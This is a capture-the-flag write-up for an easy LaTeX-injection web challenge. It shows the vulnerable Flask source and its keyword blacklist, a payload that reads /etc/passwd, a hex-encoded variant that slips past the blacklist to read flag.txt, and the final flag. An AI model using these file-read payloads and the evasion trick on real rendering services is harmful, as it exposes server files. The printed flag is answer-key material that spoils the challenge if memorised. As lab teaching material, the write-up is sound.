# Kethal's Transmitter

#### Category: Web Exploitation

#### Difficulty: Easy

#### Type: White Box

#### Description: Sending signals over space can take a long time.  Kethal recently built a technology capable of transmitting messages to other galaxies using a specific signal.  If only I could figure out what techniques he uses.

#### Preview:

![image](https://github.com/user-attachments/assets/6c47c66e-d94e-4210-9181-d0e173553ad6)

## Set Up & Installation

Ensure that docker is installed in your virtual machine before the set up process.

#### [1] Download challenge files
Ensure to download the challenge file `Challenge.zip`

#### [2] Build challenge Docker image 
`sudo docker build -t chall .`

#### [3] Run the image inside a container
`sudo docker run -d chall`

#### [4] Get Docker container IP address
`sudo docker inspect <container-id> | grep 'IP'`

#### [5] Access challenge website
Access to `http://docker_ip:5000`

## Solution
<details>

![image](https://github.com/user-attachments/assets/c95bf775-d98c-40c8-8eb8-8329154a928e)

### Source Code (Python)
```python
from flask import Flask, render_template, request, jsonify
import subprocess
import os
import uuid
import base64
import time
import shutil

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
app.config['TEMP_FOLDER'] = 'temp'
app.config['FLAG'] = 'ICTF25{test_flag}'

os.makedirs(app.config['TEMP_FOLDER'], exist_ok=True)

LATEX_TEMPLATE = r"""
\documentclass{{article}}
\usepackage{{amsmath}}
\pagestyle{{empty}}

\begin{{document}}
{}
\end{{document}}
"""

blacklisted = ['flag', '.txt','newread','openin','read','file','line','closein','verbatim','usepackage','verbatiminput','lstinputlisting']

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/render', methods=['POST'])
def render_latex():
    cleanup_old_jobs(app.config['TEMP_FOLDER'])

    latex_code = request.form.get('latex', '')

    for word in blacklisted:
        if word in latex_code.lower():
            return jsonify({'error': 'Forbidden word detected'})

    job_id = str(uuid.uuid4())
    job_dir = os.path.join(app.config['TEMP_FOLDER'], job_id)
    os.makedirs(job_dir, exist_ok=True)

    try:
        flag_path = os.path.join(job_dir, 'flag.txt')
        with open(flag_path, 'w') as f:
            f.write(app.config['FLAG'])  

        full_latex = LATEX_TEMPLATE.format(latex_code)
        tex_file = os.path.join(job_dir, 'document.tex')
        with open(tex_file, 'w') as f:
            f.write(full_latex)

        result = subprocess.run(
            ['pdflatex', '-interaction=nonstopmode', '-output-directory', job_dir, tex_file],
            timeout=5,
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return jsonify({
                'error': 'Invalid Function!'
            })

        pdf_file = os.path.join(job_dir, 'document.pdf')
        png_file = os.path.join(job_dir, 'output.png')
        convert_result = subprocess.run(
            ['convert', '-density', '150', pdf_file, '-quality', '90', png_file],
            timeout=5,
            capture_output=True,
            text=True
        )

        if convert_result.returncode != 0:
            return jsonify({'error': 'Image conversion failed'})

        with open(png_file, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')

        response = {'image': image_data}
        return jsonify(response)

    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Compilation Timed Out'})
    except Exception as e:
        return jsonify({'error': 'An error occurred'})
    finally:
        pass


def cleanup_old_jobs(temp_folder, max_age_seconds=60): 
    now = time.time()
    for job_name in os.listdir(temp_folder):
        job_path = os.path.join(temp_folder, job_name)
        if os.path.isdir(job_path):
            try:
                creation_time = os.path.getctime(job_path)
                if now - creation_time > max_age_seconds:
                    shutil.rmtree(job_path)
            except Exception as e:
                print(f"Cleanup error for {job_path}: {e}")


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

Based on the source code, the vulnerability of the website seems like [Latex Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)

```
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

To bypass a blacklist try to replace one character with it's unicode hex value. Can refer to [PayloadsAllTheThins](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md)

![image](https://github.com/user-attachments/assets/cd88bbcf-7b6f-4586-b7d9-b8bb96f9c018)

Blacklisted strings:
`'flag', '.txt', 'newread', 'openin', 'read', 'file', 'line', 'closein', 'verbatim', 'usepackage', 'verbatiminput', 'lstinputlisting'`

Encode the characters with hex to bypass blacklisted words.

![image](https://github.com/user-attachments/assets/b1fa3b60-e075-4aca-8c5b-aa82e99c9af6)

Therefore, we can try use the same payload again and encode some of the characters with its hex value to bypass the blacklisting function.

![image](https://github.com/user-attachments/assets/4a5ea1f8-6eeb-4b68-aa09-e35b662b802c)

It seems like it works so we can encode the rest of the characters like "flag.txt" to read the content of the file. The following payload should look like this:

```
\newr^^65ad\fil^^65
\open^^69n\fil^^65=fl^^61g.t^^78t
\re^^61d\fil^^65 to\lin^^65
\text{\lin^^65}
\close^^69n\fil^^65
```

Using the payload and submit it into the input will reveal the contents inside the file "flag.txt". Thus, the flag is successfully obtained.

![image](https://github.com/user-attachments/assets/82d48f15-4a35-4436-b332-82c7d361b9da)

### Flag
> ICTF25{dd265d58e3e1941a0cce646df439ea13c931d0159fe5c754cd39c8bad146fea7}

</details>
